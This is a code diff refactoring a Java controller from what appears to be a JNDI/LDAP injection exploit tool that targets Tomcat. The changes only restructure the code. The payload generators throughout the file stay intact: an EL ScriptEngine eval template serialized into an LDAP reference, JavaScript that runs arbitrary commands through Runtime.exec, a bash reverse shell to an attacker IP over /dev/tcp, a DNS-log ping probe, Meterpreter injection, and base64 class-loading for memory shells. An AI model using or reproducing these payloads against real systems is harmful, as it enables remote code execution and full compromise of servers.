@@ -4,9 +4,7 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.template.*;
-import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
-import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.utils.Config;
 import com.nu1r.jndi.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
@@ -18,7 +16,6 @@ import org.apache.commons.codec.binary.Base64;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
-import java.io.IOException;
 
 import static com.nu1r.jndi.controllers.BasicController.insertKeyMethod;
 import static org.fusesource.jansi.Ansi.ansi;
@@ -34,11 +31,6 @@ import static org.fusesource.jansi.Ansi.ansi;
 public class TomcatBypassController implements LdapController {
     private PayloadType type;
     private String[]    params;
-    private String      payloadTemplate = "{" +
-            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-            ".newInstance().getEngineByName(\"JavaScript\")" +
-            ".eval(\"{replacement}\")" +
-            "}";
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -120,6 +112,11 @@ public class TomcatBypassController implements LdapController {
                 break;
         }
 
+        String payloadTemplate = "{" +
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                ".newInstance().getEngineByName(\"JavaScript\")" +
+                ".eval(\"{replacement}\")" +
+                "}";
         String finalPayload = payloadTemplate.replace("{replacement}", code);
         ref.add(new StringRefAddr("x", finalPayload));
         e.addAttribute("javaSerializedData", Util.serialize(ref));
@@ -179,9 +176,9 @@ public class TomcatBypassController implements LdapController {
     private class TomcatBypassHelper {
 
 
-        public String getExecCode(String cmd) throws IOException {
+        public String getExecCode(String cmd) {
 
-            String code = "var strs=new Array(3);\n" +
+            return "var strs=new Array(3);\n" +
                     "        if(java.io.File.separator.equals('/')){\n" +
                     "            strs[0]='/bin/bash';\n" +
                     "            strs[1]='-c';\n" +
@@ -192,12 +189,11 @@ public class TomcatBypassController implements LdapController {
                     "            strs[2]='" + cmd + "';\n" +
                     "        }\n" +
                     "        java.lang.Runtime.getRuntime().exec(strs);";
-
-            return code;
         }
 
         public String getDnsRequestCode(String dnslog) {
-            String code = "var str;\n" +
+
+            return "var str;\n" +
                     "            if(java.io.File.separator.equals('/')){\n" +
                     "                str = 'ping -c 1 " + dnslog + "';\n" +
                     "            }else{\n" +
@@ -205,18 +201,15 @@ public class TomcatBypassController implements LdapController {
                     "            }\n" +
                     "\n" +
                     "            java.lang.Runtime.getRuntime().exec(str);";
-
-            return code;
         }
 
         public String getReverseShellCode(String ip, String port) {
             int pt = Integer.parseInt(port);
-            String code = "if(java.io.File.separator.equals('/')){\n" +
+
+            return "if(java.io.File.separator.equals('/')){\n" +
                     "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                     "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                     "            }";
-
-            return code;
         }
 
         public String injectTomcatEcho() {
@@ -232,7 +225,7 @@ public class TomcatBypassController implements LdapController {
         }
 
         //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
-        public String injectMeterpreter() throws NoSuchFieldException, IllegalAccessException {
+        public String injectMeterpreter() {
             System.out.println("------------------------");
             return injectClass(Meterpreter.class);
         }
@@ -379,7 +372,7 @@ public class TomcatBypassController implements LdapController {
                 e.printStackTrace();
             }
 
-            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                     "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                     "try{\n" +
                     "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
@@ -390,8 +383,6 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
                     "};";
-
-            return code;
         }
 
         public String injectShell(byte[] classBytes, String clazzName) {
@@ -405,7 +396,7 @@ public class TomcatBypassController implements LdapController {
                 e.printStackTrace();
             }
 
-            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                     "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                     "try{\n" +
                     "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
@@ -416,8 +407,6 @@ public class TomcatBypassController implements LdapController {
                     "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                     "   clazz.newInstance();\n" +
                     "};";
-
-            return code;
         }
 
     }
